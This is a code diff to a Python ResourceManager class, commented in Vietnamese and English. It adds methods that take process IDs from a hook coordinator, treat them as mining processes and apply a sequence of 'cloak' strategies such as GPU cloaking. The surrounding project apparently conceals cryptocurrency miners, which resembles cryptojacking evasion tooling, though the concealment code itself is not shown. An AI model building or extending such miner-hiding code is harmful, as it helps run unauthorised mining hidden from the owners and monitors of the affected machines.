@@ -294,6 +294,10 @@ class ResourceManager(IResourceManager):
         # 🚀 **DIRECT REGISTRY OBSERVER** (quan sát registry trực tiếp) - **THAY THẾ EVENTBUS**
         self._setup_direct_registry_observer()
         
+        # ✅ **LINEAR FLOW INTEGRATION** (tích hợp luồng tuyến tính) - Enhanced coordination tracking
+        self._linear_handoff_tracking = {}
+        self._linear_handoff_lock = threading.Lock()
+        
         # Hàng đợi cloaking chung (legacy compatibility)
         self.resource_adjustment_queue = queue.PriorityQueue()
 
@@ -976,6 +980,132 @@ class ResourceManager(IResourceManager):
                 self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
             else:
                 self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")
+
+    def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
+        """
+        **Receive From Coordinator** (nhận từ coordinator)
+        
+        Enhanced linear flow method để nhận sequential handoff từ Hook Coordinator.
+        Triggers immediate strategy application sau khi nhận coordination signal.
+        
+        Args:
+            pid: Process ID từ coordinator
+            coordinator_metadata: Metadata từ coordinator handoff
+            
+        Returns:
+            bool: True nếu resource management initialization successful
+        """
+        try:
+            self.logger.info(f"🔄 [RM-LINEAR-RECEIVE] Receiving PID {pid} from coordinator via sequential handoff")
+            self.logger.debug(f"🔍 [RM-LINEAR-RECEIVE] Coordinator metadata: {coordinator_metadata}")
+            
+            with self._linear_handoff_lock:
+                # **Track linear handoff metadata** (theo dõi metadata handoff tuyến tính)
+                handoff_record = {
+                    'timestamp': time.time(),
+                    'source': 'hook_coordinator',
+                    'original_metadata': coordinator_metadata,
+                    'resource_manager_timestamp': time.time(),
+                    'handoff_chain': coordinator_metadata.get('handoff_chain', []) + ['resource_manager']
+                }
+                
+                self._linear_handoff_tracking[pid] = handoff_record
+                self.logger.debug(f"📝 [RM-LINEAR-RECEIVE] Handoff record stored for PID {pid}")
+            
+            # **Immediate strategy orchestration** (điều phối chiến lược ngay lập tức)
+            orchestration_success = self._orchestrate_linear_strategies(pid, handoff_record)
+            
+            if orchestration_success:
+                self.logger.info(f"✅ [RM-LINEAR-RECEIVE] Successfully received and orchestrated strategies for PID {pid}")
+                return True
+            else:
+                self.logger.warning(f"⚠️ [RM-LINEAR-RECEIVE] Strategy orchestration failed for PID {pid}")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [RM-LINEAR-RECEIVE] Failed to receive from coordinator for PID {pid}: {e}")
+            return False
+    
+    def _orchestrate_linear_strategies(self, pid: int, handoff_metadata: Dict[str, Any]) -> bool:
+        """
+        **Orchestrate Linear Strategies** (điều phối chiến lược tuyến tính)
+        
+        Core orchestration method cho sequential strategy application trong linear flow.
+        Triggers strategy chain based on handoff metadata and process characteristics.
+        
+        Args:
+            pid: Process ID
+            handoff_metadata: Metadata từ linear handoff chain
+            
+        Returns:
+            bool: True nếu strategy orchestration successful
+        """
+        try:
+            self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Starting linear strategy orchestration for PID {pid}")
+            
+            # **Check if we have an active SharedResourceManager** (kiểm tra SharedResourceManager đang hoạt động)
+            if not self.shared_resource_manager:
+                self.logger.warning(f"⚠️ [STRATEGY-ORCHESTRATION] SharedResourceManager not initialized - deferring orchestration")
+                return False
+            
+            # **Create MiningProcess object for strategy application** (tạo đối tượng MiningProcess cho áp dụng chiến lược)
+            try:
+                import psutil
+                process_obj = psutil.Process(pid)
+                mining_process = MiningProcess(
+                    pid=pid,
+                    name=process_obj.name(),
+                    cpu_percent=0,  # Will be updated during strategy application
+                    memory_percent=0  # Will be updated during strategy application
+                )
+                
+                # **Sequential strategy application** (áp dụng chiến lược tuần tự)
+                # Apply strategies in specific order for predictable results
+                strategy_sequence = self._determine_strategy_sequence(handoff_metadata)
+                
+                for strategy_name in strategy_sequence:
+                    try:
+                        self.logger.info(f"🔄 [STRATEGY-ORCHESTRATION] Applying strategy '{strategy_name}' to PID {pid}")
+                        self.shared_resource_manager.apply_cloak_strategy(strategy_name, mining_process)
+                        self.logger.info(f"✅ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' applied successfully")
+                    except Exception as strategy_err:
+                        self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy '{strategy_name}' failed for PID {pid}: {strategy_err}")
+                        # Continue with other strategies
+                
+                self.logger.info(f"🎯 [STRATEGY-ORCHESTRATION] Linear strategy orchestration completed for PID {pid}")
+                return True
+                
+            except psutil.NoSuchProcess:
+                self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Process {pid} no longer exists")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [STRATEGY-ORCHESTRATION] Strategy orchestration failed for PID {pid}: {e}")
+            return False
+    
+    def _determine_strategy_sequence(self, handoff_metadata: Dict[str, Any]) -> List[str]:
+        """
+        **Determine Strategy Sequence** (xác định trình tự chiến lược)
+        
+        Intelligent strategy sequencing based on handoff metadata và process characteristics.
+        
+        Args:
+            handoff_metadata: Metadata từ handoff chain
+            
+        Returns:
+            List[str]: Ordered list of strategy names to apply
+        """
+        # **Default GPU strategy sequence** (trình tự chiến lược GPU mặc định)
+        # Designed for optimal cloaking effectiveness
+        default_sequence = [
+            'default_gpu_cloak',  # Base GPU cloaking
+            'thermal_management',  # Thermal optimization
+            'performance_optimization'  # Performance tuning
+        ]
+        
+        # **Future enhancement**: Analyze handoff metadata for intelligent sequencing
+        # For now, return default sequence for predictable behavior
+        return default_sequence
 
     def start(self):
         self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
